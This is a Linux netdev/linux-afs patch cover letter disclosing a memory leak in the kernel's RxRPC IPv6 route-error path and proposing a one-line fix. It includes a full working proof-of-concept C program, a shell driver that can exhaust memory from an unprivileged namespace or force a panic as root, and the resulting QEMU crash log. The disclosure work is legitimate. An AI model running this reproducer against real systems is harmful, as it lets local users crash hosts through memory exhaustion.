Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.48
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792693806;
	b=usducA7wzQaf8Ge8lKBSQEAPK84hcSqbfRd2j0v7OEg1Pnyx7xcn0RfR/gQ0korMi0Nm
	 2lKv+7B7eiwfUtdcKik2ZzLTX/lamY1BRrpeYbWwHkfAsXxfw4/zuaCB21KP0U8nzgtng
	 fDKI4oTwJ4iEIoS0bThACB5maX5WpPYcYmp0UCBjPvE99562KfYYBNDY6jqaeLArvHd49
	 HO/uCuqxp5mCGiTo146+qSEKuhRJ6h84v+OJnFy32I8GrESeKKF1QKUPhJh9necxF6cmu
	 +JROwTsWliyjB8QCcr54h6gdVHcFTYvoBR2VuWeFg80dTAirSSnQWaLbpXm17tRetcQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792693806;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=IO3Zh1aWxxIkTnXUdnUn0OJRoUl9zLRuzYDSbiik+WE=;
	b=j4LnGJNQpevE7Sh3UuTq04GLC2j6G8Lr4FESrvHw31b4gLq7yeQL8kCW00akArHnyK/8
	 OD15HqBw4VAkEj6kOYmdoWRrunprh07Bh/8spqAKB/CDbh6r8a6fG/1IsbwTvNZMRa/tW
	 R7bNlT8u5rSvMW0d0rujKnCJpI313U2NnxWFXtv/7UzRuG2kJFNjXXrHYR+drZXlLMBdI
	 MQiBNPbDS35bZ9JEhjjMhnCOoKgMJsu3h3y+qUekEbfyqikhOjxuM2HYztwzd55VqnjOg
	 UfjHFZ5BMSj4oMystHQU+mG+FM11XjU8mCX5G9ypT0ltCAM+klqNBN9O/23BAXVeAgQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b="Cdw/JM2j";
	arc=none smtp.remote-ip=209.85.216.48
Received: from mail-pj1-f48.google.com (mail-pj1-f48.google.com [209.85.216.48])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 896C9606A319
	for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 18:30:05 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 896C9606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=Cdw/JM2j
Received: by mail-pj1-f48.google.com with SMTP id 98e67ed59e1d1-38ec1402b05so77046a91.2
        for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 11:30:05 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792693805; x=1793298605; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=IO3Zh1aWxxIkTnXUdnUn0OJRoUl9zLRuzYDSbiik+WE=;
        b=Cdw/JM2jT2zT7BFUbPAPOrc74b+EMQq44iAqR7Jt+gAu1SeeYrjgY5IxaNBzOw6mdx
         Bb232s7sbbJQXf1wOfwhuXxF++iCJedbvy6x6jvyX4f3zdijrVVrU2/Hlx6TVWuI5ltP
         fc26JksUD62lCUqPUZKmHESOZknZJKVfr/yzv3fP4vsgngtbp/tQx/qobLy3gP+00TgM
         42i6uYHlWfe1zSQLEoyzFXMlAdyY87kZBwvWZVEqVeqiK57KEfMwGdKOwlwdNbgnQGHO
         D17eeJzPEyd1MW+wJmL8qKVqpCtjg2c+sEB775QySbjD5M5mO2WdElThoUMDagu0aQIZ
         B1aQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792693805; x=1793298605;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=IO3Zh1aWxxIkTnXUdnUn0OJRoUl9zLRuzYDSbiik+WE=;
        b=c7jTlLMT+b12dwkkIn6FvxZHodGc7nocw8ThkU9wN1kRB0n673GnmyC44bNHocFeVL
         176UxISUSZ2UJW9WHYAEXKWItN21jk6vtcQhHwMIP6XbZomhQJ346DXzQafh+YShtj0N
         vnIPJLthVRe4N3FFqd7D2/Lt7dREFswPKHbITUrwydVOlYfsHOoM14YgT8F+JAh1Fef/
         1MW6g44Icodlgpzas4oAGPQYgOWB2NmUhpvEORkEigi6cS026VbiinAFy4CZ0D+tiQNL
         k2MPDvbc5bLw7PyBli/n0cR5w0VB/VfjSDFKJhts4v/bRxHC7ZVabgXpGHgUNgEgwUVd
         qA9w==
X-Forwarded-Encrypted: i=1; AKwUvBwqJ9TY9qghmWfB+Zukv/16/RT9pMtUqddzGg6YL6zKuBKd6rkmi5D3Dky3zMgzhSJi06rnG3M=@vger.kernel.org
X-Gm-Message-State: AFq9FYLrQNg0Lx9wMSYlCX7qLgIB0glh81rTovNf7MgJ/7QZY3U4YPzm
	YrhyyHNBUc9E/+qMV037D2cCiG7nUK8No7ZwrREAxpLVYb6rr9E+cEfv4qK13I/bSq0D
X-Gm-Gg: AYBFou3Cw1fgbXwGsmA95L9idxSqqtajkNFQxJiO+YD5/bszwRnpDY7vlPrnviBjEsy
	/vIX96tjWVluvUQ+UnIUyDHngua3IhcS0BuYlAYG5XNO25KGhuZeRBUsZalVhOjhIwz7FQzasIf
	xqRDob/fzGVZkPyz22FhLBxSi8G07UBLeAJUKKtKgmXB9pPKRdZJoTlRer8oFlWV8pvNB9T9rbW
	yc8Qnt531352ON82S55vFik/y3LcctMlsf3UgGEuYgcRMLZxtbFSWT3dZfvETfiN5u/Cac505o4
	WKNHvny4q/m0NWMki6NAxm01IP0cgsmqCp6y9ccNKpnIssshAfKEd1NDCM/7vNvRFxqHPQOjS+8
	r37bUAFfJdu/sAWQsfyF9Rw9JszN+R6QNVEfG3MeE5ryKkjYNhZ7efkEuxD+SptCRsEFz6M7nLD
	CgBV1QcIssUz6UP/YIZS7bVmfIdSM+hDLyqVO0hlYlysIgYumO7K0/WJQYK716viwnB0JzX1TPr
	HlHq/5NwLLSIWFdSWLbNzJ2f8hpBniGOgt65d7bvLiwMasGxSVpuD9fMP4Cvt9vHJ/UQZiIF5G8
	x89bCYGKFY4i/Q==
X-Received: by 2002:a17:90b:580d:b0:3ab:b764:826c with SMTP id 98e67ed59e1d1-3ad86d1c9eamr5271537a91.12.1792693804570;
        Thu, 22 Oct 2026 11:30:04 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2001:49f0:d0db:ffab:2834:5ac2:f726:a005])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3adcb1d8b55sm22447a91.14.2026.10.22.11.29.59
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 22 Oct 2026 11:30:04 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-afs@lists.infradead.org,
	netdev@vger.kernel.org
Cc: dhowells@redhat.com,
	marc.dionne@auristor.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] rxrpc: release IPv6 dst on route error
Date: Fri, 23 Oct 2026 02:29:50 +0800
Message-ID: <cover.1792693634.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a memory leak in net/rxrpc/peer_object.c. An
unprivileged user can trigger the IPv6 route-lookup failure path from a
user and network namespace by creating RxRPC peers for unreachable
IPv6 destinations.

We will provide details of the bug below, along with a PoC and the
QEMU crash log.

---- details below ----

Bug details:

rxrpc_assess_MTU_size() calls ip6_route_output() for an IPv6 peer. The
helper returns a referenced dst_entry even when the route lookup fails;
the failure is reported through dst->error. The error branch returns
without releasing dst, while the normal path releases it at the end of
the function. Each newly created peer for a failing destination can
therefore leak a destination reference.

Repeated requests for one peer are limited by the peer cache, so the
PoC uses distinct unreachable IPv6 prefixes to create new peers and
amplify the leak. The namespace-mode reproducer exercises the path
without requiring root. The supplied QEMU log shows system-wide OOM
followed by a panic after enabling vm.panic_on_oom; that setting is
only used to make the OOM outcome deterministic in the test guest.

Release the destination before returning from the IPv6 route-error
branch.

Reproducer:

    make
    ITERATIONS=1 BATCH=1 ./poc.sh ns-leak

For the supplied OOM/panic log, run the root-only amplification inside
a disposable QEMU guest:

    ./poc.sh root-crash

The crash was reproduced in a QEMU guest running Linux 6.12.74 with
CONFIG_AF_RXRPC, CONFIG_AF_RXRPC_IPV6, CONFIG_IPV6, CONFIG_USER_NS,
CONFIG_NET_NS, and KASAN enabled.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <inttypes.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif

#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif

#ifndef RXRPC_USER_CALL_ID
#define RXRPC_USER_CALL_ID 1
#endif

#ifndef RXRPC_SET_CALL_TIMEOUT
#define RXRPC_SET_CALL_TIMEOUT 13
#endif

struct sockaddr_rxrpc {
	sa_family_t srx_family;
	uint16_t srx_service;
	uint16_t transport_type;
	uint16_t transport_len;
	union {
		sa_family_t family;
		struct sockaddr_in sin;
		struct sockaddr_in6 sin6;
	} transport;
};

struct options {
	uint64_t iterations;
	uint32_t batch;
	uint32_t timeout_ms;
	uint16_t service_id;
	uint16_t port;
	bool per_prefix;
	bool quiet;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-n iterations] [-b batch] [-t timeout_ms] [-s service] [-p port] [-x] [-q]\n",
		prog);
}

static void parse_u64(const char *what, const char *arg, uint64_t *out)
{
	char *end = NULL;
	unsigned long long value;

	errno = 0;
	value = strtoull(arg, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", what, arg);
		exit(1);
	}

	*out = value;
}

static void parse_u32(const char *what, const char *arg, uint32_t *out)
{
	uint64_t value = 0;

	parse_u64(what, arg, &value);
	if (value > UINT32_MAX) {
		fprintf(stderr, "%s out of range: %s\n", what, arg);
		exit(1);
	}
	*out = (uint32_t)value;
}

static void parse_u16(const char *what, const char *arg, uint16_t *out)
{
	uint64_t value = 0;

	parse_u64(what, arg, &value);
	if (value > UINT16_MAX) {
		fprintf(stderr, "%s out of range: %s\n", what, arg);
		exit(1);
	}
	*out = (uint16_t)value;
}

static void parse_args(int argc, char **argv, struct options *opts)
{
	int c;

	*opts = (struct options) {
		.iterations = 1000000,
		.batch = 64,
		.timeout_ms = 1,
		.service_id = 1,
		.port = 7001,
		.quiet = false,
	};

	while ((c = getopt(argc, argv, "n:b:t:s:p:xqh")) != -1) {
		switch (c) {
		case 'n':
			parse_u64("iterations", optarg, &opts->iterations);
			break;
		case 'b':
			parse_u32("batch", optarg, &opts->batch);
			break;
		case 't':
			parse_u32("timeout_ms", optarg, &opts->timeout_ms);
			break;
		case 's':
			parse_u16("service", optarg, &opts->service_id);
			break;
		case 'p':
			parse_u16("port", optarg, &opts->port);
			break;
		case 'x':
			opts->per_prefix = true;
			break;
		case 'q':
			opts->quiet = true;
			break;
		case 'h':
		default:
			usage(argv[0]);
			exit(c == 'h' ? 0 : 1);
		}
	}

	if (opts->batch == 0) {
		fprintf(stderr, "batch must be > 0\n");
		exit(1);
	}
}

static void build_address(struct sockaddr_rxrpc *srx, uint16_t service_id,
			  uint16_t port, uint64_t sequence, bool per_prefix)
{
	uint8_t *addr;

	memset(srx, 0, sizeof(*srx));
	srx->srx_family = AF_RXRPC;
	srx->srx_service = service_id;
	srx->transport_type = SOCK_DGRAM;
	srx->transport_len = sizeof(struct sockaddr_in6);
	srx->transport.sin6.sin6_family = AF_INET6;
	srx->transport.sin6.sin6_port = htons(port);

	addr = (uint8_t *)&srx->transport.sin6.sin6_addr;
	addr[0] = 0x20;
	addr[1] = 0x01;
	addr[2] = 0x0d;
	addr[3] = 0xb8;

	if (per_prefix) {
		uint32_t prefix = (uint32_t)sequence;

		addr[4] = (uint8_t)(prefix >> 24);
		addr[5] = (uint8_t)(prefix >> 16);
		addr[6] = (uint8_t)(prefix >> 8);
		addr[7] = (uint8_t)prefix;
		addr[15] = 0x01;
	} else {
		addr[4] = 0x00;
		addr[5] = 0x01;

		for (int i = 0; i < 8; i++)
			addr[15 - i] = (uint8_t)(sequence >> (i * 8));
	}
}

static void fill_cmsgs(char *control, size_t control_len,
		       unsigned long user_call_id, uint32_t timeout_ms,
		       struct msghdr *msg)
{
	struct cmsghdr *cmsg;

	memset(control, 0, control_len);
	memset(msg, 0, sizeof(*msg));
	msg->msg_control = control;
	msg->msg_controllen = control_len;

	cmsg = CMSG_FIRSTHDR(msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(user_call_id));
	memcpy(CMSG_DATA(cmsg), &user_call_id, sizeof(user_call_id));

	cmsg = CMSG_NXTHDR(msg, cmsg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_SET_CALL_TIMEOUT;
	cmsg->cmsg_len = CMSG_LEN(sizeof(timeout_ms));
	memcpy(CMSG_DATA(cmsg), &timeout_ms, sizeof(timeout_ms));
}

static bool expected_errno(int err)
{
	switch (err) {
	case ENETUNREACH:
	case EHOSTUNREACH:
	case EACCES:
	case EINVAL:
	case ECONNREFUSED:
	case ETIMEDOUT:
	case EKEYREJECTED:
	case ENOKEY:
	case EKEYEXPIRED:
	case ENETDOWN:
	case ESHUTDOWN:
	case EPIPE:
		return true;
	default:
		return false;
	}
}

int main(int argc, char **argv)
{
	static const char payload = 'A';
	struct options opts;
	uint64_t attempted = 0;
	uint64_t successful = 0;
	uint64_t expected_failures = 0;
	uint64_t unexpected_failures = 0;
	uint64_t next_progress = 1000;
	char control[CMSG_SPACE(sizeof(unsigned long)) +
		     CMSG_SPACE(sizeof(uint32_t))];
	struct iovec iov = {
		.iov_base = (void *)&payload,
		.iov_len = sizeof(payload),
	};
	struct timespec batch_pause = {
		.tv_sec = 0,
		.tv_nsec = 10 * 1000 * 1000,
	};

	parse_args(argc, argv, &opts);

	for (uint64_t base = 0; base < opts.iterations; ) {
		int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET6);
		uint32_t batch_count = 0;

		if (fd < 0) {
			perror("socket(AF_RXRPC, SOCK_DGRAM, PF_INET6)");
			return 1;
		}

		while (base < opts.iterations && batch_count < opts.batch) {
			struct sockaddr_rxrpc srx;
			struct msghdr msg;
			ssize_t ret;
			unsigned long user_call_id =
				(unsigned long)(base + 1);

			build_address(&srx, opts.service_id, opts.port, base + 1,
				      opts.per_prefix);
			fill_cmsgs(control, sizeof(control), user_call_id,
				   opts.timeout_ms, &msg);
			msg.msg_name = &srx;
			msg.msg_namelen = sizeof(srx);
			msg.msg_iov = &iov;
			msg.msg_iovlen = 1;

			ret = sendmsg(fd, &msg, 0);
			attempted++;
			if (ret >= 0) {
				successful++;
			} else if (expected_errno(errno)) {
				expected_failures++;
			} else {
				unexpected_failures++;
				fprintf(stderr,
					"unexpected sendmsg failure at iteration %" PRIu64
					": errno=%d (%s)\n",
					base + 1, errno, strerror(errno));
			}

			base++;
			batch_count++;

			if (!opts.quiet && attempted >= next_progress) {
				fprintf(stderr,
					"[+] attempted=%" PRIu64
					" successful=%" PRIu64
					" expected_failures=%" PRIu64
					" unexpected_failures=%" PRIu64 "\n",
					attempted, successful, expected_failures,
					unexpected_failures);
				next_progress += 1000;
			}
		}

		close(fd);
		nanosleep(&batch_pause, NULL);
	}

	fprintf(stderr,
		"[+] done: attempted=%" PRIu64
		" successful=%" PRIu64
		" expected_failures=%" PRIu64
		" unexpected_failures=%" PRIu64 "\n",
		attempted, successful, expected_failures, unexpected_failures);
	return unexpected_failures ? 1 : 0;
}

------END poc.c--------

------BEGIN poc.sh------

#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
MODE=${1:-root-crash}

: "${ITERATIONS:=1000000}"
: "${BATCH:=64}"
: "${TIMEOUT_MS:=1}"
: "${SERVICE_ID:=1}"
: "${RXRPC_PORT:=7001}"
: "${ROUTES:=200000}"

make -C "$DIR"

run_single_prefix() {
	ip link set lo up
	ip -6 route replace unreachable 2001:db8:1::/64
	exec "$DIR/poc" -n "$ITERATIONS" -b "$BATCH" -t "$TIMEOUT_MS" \
		-s "$SERVICE_ID" -p "$RXRPC_PORT"
}

run_many_prefixes() {
	rm -f /tmp/rxrpc-routes.batch
	i=1
	while [ "$i" -le "$ROUTES" ]; do
		hi=$(( (i >> 16) & 0xffff ))
		lo=$(( i & 0xffff ))
		printf 'route add unreachable 2001:db8:%x:%x::/64\n' \
			"$hi" "$lo" >> /tmp/rxrpc-routes.batch
		i=$((i + 1))
	done

	ip link set lo up
	ip -6 -batch /tmp/rxrpc-routes.batch
	exec "$DIR/poc" -x -n "$ROUTES" -b "$BATCH" -t "$TIMEOUT_MS" \
		-s "$SERVICE_ID" -p "$RXRPC_PORT"
}

case "$MODE" in
root-crash)
	echo 1 > /proc/sys/vm/panic_on_oom
	exec unshare -Urn sh -c "
		set -eu
		rm -f /tmp/rxrpc-routes.batch
		i=1
		while [ \"\$i\" -le '$ROUTES' ]; do
			hi=\$(( (\$i >> 16) & 0xffff ))
			lo=\$(( \$i & 0xffff ))
			printf 'route add unreachable 2001:db8:%x:%x::/64\n' \
				\"\$hi\" \"\$lo\" >> /tmp/rxrpc-routes.batch
			i=\$((i + 1))
		done
		ip link set lo up
		ip -6 -batch /tmp/rxrpc-routes.batch
		exec '$DIR/poc' -x -n '$ROUTES' -b '$BATCH' -t '$TIMEOUT_MS' \
			-s '$SERVICE_ID' -p '$RXRPC_PORT'
	"
	;;
root-leak)
	run_single_prefix
	;;
ns-leak)
	exec unshare -Urn sh -c "
		set -eu
		ip link set lo up
		ip -6 route replace unreachable 2001:db8:1::/64
		exec '$DIR/poc' -n '$ITERATIONS' -b '$BATCH' -t '$TIMEOUT_MS' \
			-s '$SERVICE_ID' -p '$RXRPC_PORT'
	"
	;;
*)
	echo "usage: $0 [root-crash|root-leak|ns-leak]" >&2
	exit 1
	;;
esac

------END poc.sh--------

----BEGIN crash log----

[  702.336472][T10224] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[  702.337177][T10224] CPU: 1 UID: 0 PID: 10224 Comm: poc Not tainted 6.12.74 #3
[  702.337692][T10224] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  702.338410][T10224] Call Trace:
[  702.338654][T10224]  <TASK>
[  702.338882][T10224]  dump_stack_lvl+0x3b/0x1f0
[  702.339253][T10224]  panic+0x6fe/0x7e0
[  702.339562][T10224]  ? dump_header+0x6c2/0x950
[  702.339930][T10224]  ? __pfx_panic+0x10/0x10
[  702.340283][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.340706][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.341165][T10224]  ? out_of_memory+0x8c5/0x16b0
[  702.341552][T10224]  out_of_memory+0x8f3/0x16b0
[  702.341931][T10224]  ? __pfx_out_of_memory+0x10/0x10
[  702.342331][T10224]  ? lock_acquire+0x2f/0xb0
[  702.342675][T10224]  ? __alloc_pages_noprof+0xd59/0x26d0
[  702.343113][T10224]  __alloc_pages_noprof+0x1ec3/0x26d0
[  702.343565][T10224]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  702.343993][T10224]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  702.344422][T10224]  ? __mutex_trylock_common+0xde/0x250
[  702.344832][T10224]  ? __pfx___mutex_trylock_common+0x10/0x10
[  702.345286][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.345706][T10224]  ? rcu_is_watching+0x12/0xc0
[  702.346116][T10224]  ? rxrpc_alloc_data_txbuf+0x102/0xcd0
[  702.346551][T10224]  __page_frag_alloc_align+0x7c2/0x920
[  702.346994][T10224]  ? __pfx___page_frag_alloc_align+0x10/0x10
[  702.347481][T10224]  rxrpc_alloc_data_txbuf+0x166/0xcd0
[  702.347904][T10224]  ? __pfx_none_alloc_txbuf+0x10/0x10
[  702.348330][T10224]  rxrpc_send_data+0xf6f/0x2b20
[  702.348713][T10224]  ? preempt_schedule_thunk+0x1a/0x30
[  702.349145][T10224]  ? __pfx_try_to_wake_up+0x10/0x10
[  702.349533][T10224]  ? __pfx_do_raw_spin_lock+0x10/0x10
[  702.349941][T10224]  ? __pfx_rxrpc_send_data+0x10/0x10
[  702.350357][T10224]  ? __pfx_default_wake_function+0x10/0x10
[  702.350790][T10224]  ? trace_rxrpc_peer+0x198/0x220
[  702.351183][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.351604][T10224]  ? rxrpc_put_peer+0xb4/0x490
[  702.351982][T10224]  rxrpc_do_sendmsg+0xdf8/0x1420
[  702.352382][T10224]  ? __pfx_rxrpc_do_sendmsg+0x10/0x10
[  702.352802][T10224]  ? __pfx_lock_release+0x10/0x10
[  702.353207][T10224]  ? mark_held_locks+0x94/0xe0
[  702.353567][T10224]  ? rxrpc_sendmsg+0x118/0x600
[  702.353942][T10224]  ? __local_bh_enable_ip+0xa7/0x120
[  702.354369][T10224]  rxrpc_sendmsg+0x42e/0x600
[  702.354728][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.355184][T10224]  ____sys_sendmsg+0x9b3/0xb50
[  702.355549][T10224]  ? __pfx_____sys_sendmsg+0x10/0x10
[  702.355954][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.356387][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.356804][T10224]  ? hlock_class+0x4e/0x130
[  702.357172][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.357596][T10224]  ? __lock_acquire+0x1249/0x3c40
[  702.357989][T10224]  ___sys_sendmsg+0x13a/0x1e0
[  702.358367][T10224]  ? __pfx____sys_sendmsg+0x10/0x10
[  702.358814][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.359239][T10224]  ? find_held_lock+0x2d/0x110
[  702.359653][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.360085][T10224]  ? fdget+0x17f/0x220
[  702.360416][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.360850][T10224]  __sys_sendmsg+0x11c/0x1f0
[  702.361220][T10224]  ? __pfx___sys_sendmsg+0x10/0x10
[  702.361651][T10224]  ? srso_alias_return_thunk+0x5/0xfbef5
[  702.362104][T10224]  do_syscall_64+0xc7/0x250
[  702.362466][T10224]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  702.362897][T10224] RIP: 0033:0x7ff60460f687
[  702.363240][T10224] Code: Unable to access opcode bytes at 0x7ff60460f65d.
[  702.363713][T10224] RSP: 002b:00007ffdc8e02790 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[  702.364295][T10224] RAX: ffffffffffffffda RBX: 00007ff60457d740 RCX: 00007ff60460f687
[  702.364830][T10224] RDX: 0000000000000000 RSI: 00007ffdc8e028e0 RDI: 0000000000000003
[  702.365373][T10224] RBP: 00007ffdc8e028ec R08: 0000000000000000 R09: 0000000000000000
[  702.365917][T10224] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffdc8e0288c
[  702.366464][T10224] R13: 0000000000030d40 R14: 00000000000003e8 R15: 000000000002c7e8
[  702.367047][T10224]  </TASK>
[  702.367494][T10224] Kernel Offset: disabled
[  702.367838][T10224] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  rxrpc: release IPv6 dst on route error

 net/rxrpc/peer_object.c | 1 +
 1 file changed, 1 insertion(+)

-- 
2.55.0
